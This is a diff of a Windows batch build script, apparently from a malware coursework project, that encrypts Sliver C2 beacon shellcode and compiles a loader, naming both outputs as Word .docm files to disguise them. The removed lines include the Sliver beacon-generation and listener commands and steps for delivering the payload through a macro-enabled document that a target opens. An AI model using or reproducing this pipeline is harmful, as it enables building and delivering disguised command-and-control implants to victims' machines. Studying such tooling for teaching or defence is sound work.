@@ -3,12 +3,6 @@ REM Build Script - Encrypt Shellcode & Compile Loader
 REM Usage: build.bat
 
 setlocal enabledelayedexpansion
-
-echo ================================================================
-echo    NT230 Malware Builder - Sliver C2 Framework
-echo ================================================================
-echo.
-
 set SHELLCODE_FILE=shellcode.bin
 set ENCRYPTED_FILE=BT7.docm
 set LOADER_OUTPUT=BT6.docm
@@ -17,22 +11,16 @@ set LOADER_SOURCE=loader\src\loader.c
 REM Check if shellcode exists
 if not exist "%SHELLCODE_FILE%" (
     echo [-] Error: %SHELLCODE_FILE% not found!
-    echo [!] Generate shellcode from Sliver first
-    echo.
-    echo Manual generation:
-    echo   sliver ^> generate beacon --mtls ^<IP^>:^<PORT^> --os windows --arch amd64 --format shellcode --skip-symbols --save shellcode.bin
     pause
     exit /b 1
 )
 
 echo [*] Step 1: Encrypting shellcode...
-echo.
 
 REM Check Python
 where python >nul 2>&1
 if errorlevel 1 (
     echo [-] Python not found!
-    echo [!] Install Python: https://www.python.org/
     pause
     exit /b 1
 )
@@ -40,8 +28,7 @@ if errorlevel 1 (
 REM Install cryptography if needed
 python -c "import cryptography" >nul 2>&1
 if errorlevel 1 (
-    echo [*] Installing cryptography module...
-    pip install cryptography
+    pip install cryptography >nul 2>&1
     if errorlevel 1 (
         echo [-] Failed to install cryptography!
         pause
@@ -66,14 +53,9 @@ REM Check for compiler
 where gcc >nul 2>&1
 if errorlevel 1 (
     echo [-] GCC not found!
-    echo [!] Install MinGW-w64:
-    echo     https://www.msys2.org/
-    echo     Then: pacman -S mingw-w64-x86_64-gcc
     pause
     exit /b 1
 )
-
-echo [+] Using MinGW GCC
 
 REM Compile loader
 cd loader
@@ -104,18 +86,3 @@ echo.
 echo [+] Files generated:
 echo   - %ENCRYPTED_FILE% (!ENCRYPTED_SIZE! bytes) - Encrypted shellcode
 echo   - %LOADER_OUTPUT% (!LOADER_SIZE! bytes) - Loader executable
-echo.
-echo [*] Next steps:
-echo   1. Create Word document with VBA macro
-echo   2. Copy VBA code from VBA_Code\malicious_code.vba
-echo   3. Place document in same folder with:
-echo      - %LOADER_OUTPUT% (loader)
-echo      - %ENCRYPTED_FILE% (encrypted payload)
-echo   4. Open document on target Windows machine
-echo   5. Enable macros when prompted
-echo.
-echo [*] Ensure Sliver listener is running on your C2 server:
-echo   sliver ^> mtls -L ^<LHOST^> -l ^<LPORT^>
-echo.
-
-pause
